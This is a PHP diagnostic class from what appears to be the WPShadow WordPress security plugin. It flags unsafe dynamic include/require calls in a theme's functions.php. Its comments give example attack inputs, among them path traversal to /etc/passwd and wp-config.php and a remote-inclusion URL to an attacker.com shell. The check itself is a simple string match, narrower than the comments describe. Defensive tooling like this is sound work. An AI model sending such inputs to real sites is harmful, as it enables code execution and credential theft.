<?php
/**
 * Theme File Include Security Diagnostic
 *
 * Checks theme files for unsafe dynamic include/require usage.
 * Dynamic include with user input = local/remote file inclusion (LFI/RFI).
 * Attacker includes malicious file = arbitrary code execution.
 *
 * **What This Check Does:**
 * - Searches theme files for include/require statements
 * - Detects dynamic paths (include \$_POST['file'])
 * - Checks for path validation/whitelist
 * - Tests for LFI patterns (include '../../etc/passwd')
 * - Searches for filter bypasses
 * - Returns severity for each unsafe include
 *
 * **Why This Matters:**
 * Dynamic include with unsanitized path = file inclusion vulnerability.
 * Attacker controls file path. Includes malicious file.
 * Code executes. Total compromise.
 *
 * **Business Impact:**
 * Theme template loader uses: include(\"/templates/\" . \$_GET['page']).
 * Attacker requests: ?page=../../../../../../etc/passwd. Includes system
 * file. Or: ?page=http://attacker.com/shell.php. Includes remote shell.
 * Attacker has code execution. With validation: only whitelisted files
 * includable. Include attack impossible.
 *
 * **Philosophy Alignment:**
 * - #8 Inspire Confidence: Theme includes are safe
 * - #9 Show Value: Prevents LFI/RFI attacks
 * - #10 Beyond Pure: Path validation by design
 *
 * **Related Checks:**
 * - Plugin Local File Inclusion Risk (similar risk)
 * - Theme Direct Database Access (complementary)
 * - File Permission Security (permissions)
 *
 * **Learn More:**
 * File inclusion security: https://wpshadow.com/kb/theme-file-include
 * Video: Preventing file inclusion attacks (11min): https://wpshadow.com/training/lfi-rfi
 *
 * @package    WPShadow
 * @subpackage Diagnostics
 * @since      1.6030.2240
 */

declare(strict_types=1);

namespace WPShadow\Diagnostics;

use WPShadow\Core\Diagnostic_Base;
use WPShadow\Core\Upgrade_Path_Helper;

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Theme File Include Security Diagnostic
 *
 * Flags dynamic includes that may allow file inclusion attacks.
 *
 * **Detection Pattern:**
 * 1. Find all theme PHP files
 * 2. Search for include/require statements
 * 3. Detect dynamic paths (with variables)
 * 4. Check if path validated/sanitized
 * 5. Test for directory traversal patterns
 * 6. Return each unsafe include
 *
 * **Real-World Scenario:**
 * Theme has template system:
 * ```
 * include(TEMPLATEPATH . '/' . \$_GET['template']);
 * ```
 * Attacker requests: ?template=../../wp-config.php. Includes file with
 * database credentials. Attacker reads output. With validation: only
 * files in /templates/ directory includable. Attack impossible.
 *
 * **Implementation Notes:**
 * - Scans active theme files
 * - Detects dynamic include/require usage
 * - Checks for path validation
 * - Severity: critical (no validation), high (weak validation)
 * - Treatment: whitelist allowed files or use include_once carefully
 *
 * @since 1.6030.2240
 */
class Diagnostic_Theme_File_Include_Security extends Diagnostic_Base {

	/**
	 * The diagnostic slug
	 *
	 * @var string
	 */
	protected static $slug = 'theme-file-include-security';

	/**
	 * The diagnostic title
	 *
	 * @var string
	 */
	protected static $title = 'Theme File Include Security';

	/**
	 * The diagnostic description
	 *
	 * @var string
	 */
	protected static $description = 'Checks theme files for unsafe dynamic include/require usage';

	/**
	 * The family this diagnostic belongs to
	 *
	 * @var string
	 */
	protected static $family = 'security';

	/**
	 * Run the diagnostic check.
	 *
	 * @since  1.6030.2240
	 * @return array|null Finding array if issue found, null otherwise.
	 */
	public static function check() {
		$theme_dir = wp_get_theme()->get_stylesheet_directory();
		$functions_file = $theme_dir . '/functions.php';

		if ( ! file_exists( $functions_file ) ) {
			return null;
		}

		$content = file_get_contents( $functions_file, false, null, 0, 60000 );
		if ( false === $content ) {
			return null;
		}

		$patterns = array(
			'include($_',
			'require($_',
			'include_once($_',
			'require_once($_',
		);

		$matches = array();
		foreach ( $patterns as $pattern ) {
			if ( false !== strpos( $content, $pattern ) ) {
				$matches[] = $pattern;
			}
		}

		if ( empty( $matches ) ) {
			return null;
		}

		return array(
			'id'           => self::$slug,
			'title'        => self::$title,
			'description'  => __( 'Unsafe dynamic file includes detected in theme', 'wpshadow' ),
			'severity'     => 'high',
			'threat_level' => 80,
			'auto_fixable' => false,
			'kb_link'      => 'https://wpshadow.com/kb/theme-file-include-security',
			'details'      => array(
				'matches' => $matches,
			),
		);
	}
}
